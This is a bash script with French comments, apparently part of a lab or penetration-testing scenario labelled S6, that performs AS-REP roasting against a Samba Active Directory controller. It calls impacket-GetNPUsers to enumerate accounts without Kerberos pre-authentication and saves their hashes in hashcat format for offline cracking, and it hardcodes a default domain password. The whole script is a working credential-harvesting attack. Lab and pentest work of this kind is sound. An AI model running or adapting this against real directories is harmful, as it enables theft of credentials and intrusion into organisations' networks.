#!/usr/bin/env bash
# S6 — AS-REP Roasting : énumération des comptes sans pré-authentification
# Cible : Samba AD DC srv-pme.nyx.tg (10.0.1.20)
#
# Usage :
#   ./asrep_roast.sh                       # creds par défaut
#   DOMAIN=nyx.tg USER=dir1 PASS='xxx' ./asrep_roast.sh
#   DOMAIN=nyx.tg USERSFILE=./custom_users.txt ./asrep_roast.sh

set -euo pipefail

DOMAIN="${DOMAIN:-nyx.tg}"
DC_IP="${DC_IP:-10.0.1.20}"
USER="${USER:-dir1}"
PASS="${PASS:-Nyx2026!}"
OUTDIR="${OUTDIR:-./logs}"
OUTFILE="${OUTFILE:-${OUTDIR}/asrep_hashes.txt}"
USERSFILE="${USERSFILE:-}"

mkdir -p "${OUTDIR}"

echo "=== S6 — AS-REP Roasting (GetNPUsers) ==="
echo "  Cible  : ${DC_IP} (${DOMAIN})"
echo "  User   : ${USER}"
echo "  Output : ${OUTFILE}"
echo ""

if [ -n "${USERSFILE}" ]; then
    echo "  Users  : ${USERSFILE} (liste fournie)"
    impacket-GetNPUsers \
        "${DOMAIN}/" \
        -dc-ip "${DC_IP}" \
        -usersfile "${USERSFILE}" \
        -format hashcat \
        -outputfile "${OUTFILE}"
else
    echo "  Users  : énumération automatique (via creds fournis)"
    impacket-GetNPUsers \
        "${DOMAIN}/${USER}:${PASS}" \
        -dc-ip "${DC_IP}" \
        -request \
        -format hashcat \
        -outputfile "${OUTFILE}"
fi

echo ""
echo "=== Terminé ==="
echo "Hashes AS-REP sauvegardés dans ${OUTFILE}"
wc -l "${OUTFILE}" 2>/dev/null || echo "(fichier vide — aucun compte sans pré-auth ?)"
